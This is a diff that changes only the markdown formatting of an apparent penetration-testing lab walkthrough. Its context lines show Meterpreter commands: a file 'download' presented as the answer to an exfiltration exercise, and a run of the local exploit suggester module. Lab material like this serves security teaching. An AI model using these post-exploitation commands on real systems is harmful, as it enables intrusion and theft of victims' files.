@@ -118,7 +118,7 @@ Found 1 result...
     c:\Users\IEUser\Documents\Drinks.recipe.txt (48 bytes)
 
  
-    - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:
+  ####Bonus: Run the command that exfiltrates the `recipe*.txt` file:
 
 
       > Answer:  meterpreter > download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'
@@ -138,7 +138,7 @@ meterpreter >
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
 
  
-   - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
+   **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
 
 meterpreter > run post/multi/recon/local_exploit_suggester
 
